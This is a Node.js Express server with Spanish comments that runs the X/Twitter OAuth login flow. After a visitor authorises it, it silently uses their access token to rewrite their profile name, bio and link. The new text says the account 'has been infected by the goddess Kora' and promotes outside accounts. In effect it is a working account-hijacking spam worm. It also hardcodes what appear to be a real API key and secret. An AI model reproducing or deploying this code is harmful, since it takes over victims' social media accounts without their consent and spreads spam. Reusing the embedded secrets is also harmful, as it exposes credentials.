const express = require("express");
const crypto = require("crypto");
const OAuth = require("oauth-1.0a");
const axios = require("axios");
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser());

/* =========================
   CONFIGURACIÓN
   ========================= */
const API_KEY = "HqsQ2W9X8nYEB4tUeQhbgA86s";
const API_SECRET = "50auXIbpm7T6oiFMK8iiNTQI9kuYUE97UrVGmEuVSy6JgDexua";
const CALLBACK_URL = "https://koradrone-1.onrender.com/callback";
/* ========================= */

const oauth = OAuth({
  consumer: { key: API_KEY, secret: API_SECRET },
  signature_method: "HMAC-SHA1",
  hash_function(base_string, key) {
    return crypto
      .createHmac("sha1", key)
      .update(base_string)
      .digest("base64");
  },
});

/* =========================
   PASO 1: REQUEST TOKEN
   ========================= */
app.get("/", async (req, res) => {
  try {
    const requestData = {
      url: "https://api.twitter.com/oauth/request_token",
      method: "POST",
      data: { oauth_callback: CALLBACK_URL },
    };

    const headers = oauth.toHeader(
      oauth.authorize(requestData)
    );

    const response = await axios.post(
      requestData.url,
      new URLSearchParams({ oauth_callback: CALLBACK_URL }),
      { headers }
    );

    const params = new URLSearchParams(response.data);
    const oauthToken = params.get("oauth_token");
    const oauthTokenSecret = params.get("oauth_token_secret");

    if (!oauthToken || !oauthTokenSecret) {
      return res.send("No se pudo obtener request token");
    }

    res.cookie("oauth_token_secret", oauthTokenSecret, {
      httpOnly: true,
      secure: true,
      sameSite: "lax",
    });

    res.redirect(
      `https://api.twitter.com/oauth/authorize?oauth_token=${oauthToken}`
    );
  } catch (err) {
    console.error("ERROR REQUEST TOKEN:", err.response?.data || err.message);
    res.send("Error iniciando login con X");
  }
});

/* =========================
   PASO 2: CALLBACK
   ========================= */
app.get("/callback", async (req, res) => {
  const { oauth_token, oauth_verifier } = req.query;
  const oauth_token_secret = req.cookies.oauth_token_secret;

  if (!oauth_token || !oauth_verifier || !oauth_token_secret) {
    return res.send("Request token no encontrado");
  }

  try {
    const requestData = {
      url: "https://api.twitter.com/oauth/access_token",
      method: "POST",
    };

    const token = {
      key: oauth_token,
      secret: oauth_token_secret,
    };

    const headers = oauth.toHeader(
      oauth.authorize(requestData, token)
    );

    const response = await axios.post(
      requestData.url,
      new URLSearchParams({ oauth_verifier }),
      {
        headers: {
          ...headers,
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );

    const params = new URLSearchParams(response.data);
    const accessToken = params.get("oauth_token");
    const accessSecret = params.get("oauth_token_secret");
    const userId = params.get("user_id");

    if (!accessToken || !accessSecret) {
      return res.send("No se pudo obtener access token");
    }

    await updateProfile(accessToken, accessSecret, userId);

    res.clearCookie("oauth_token_secret");
    res.redirect("https://twitter.com/home");

  } catch (err) {
    console.error("ERROR ACCESS TOKEN:", err.response?.data || err.message);
    res.send("Error finalizando autenticación");
  }
});

/* =========================
   ACTUALIZAR PERFIL
   ========================= */
async function updateProfile(tokenKey, tokenSecret, userId) {
  const token = { key: tokenKey, secret: tokenSecret };

  await signedPost(
    "https://api.twitter.com/1.1/account/update_profile.json",
    token,
    {
      name: `PROPAGANDA FOR THE GODDESS KORA #${userId}`,
      description:
        "This account has been infected by the goddess Kora, do not resist and fall before her too: sent.bio/mistresskorra.",
      url: "https://x.com/sissyslutty21",
    }
  );
}

/* =========================
   POST FIRMADO
   ========================= */
async function signedPost(url, token, data) {
  const requestData = { url, method: "POST", data };

  const headers = oauth.toHeader(
    oauth.authorize(requestData, token)
  );

  await axios.post(
    url,
    new URLSearchParams(data),
    { headers }
  );
}

app.listen(3000, () => {
  console.log("Servidor listo");
});
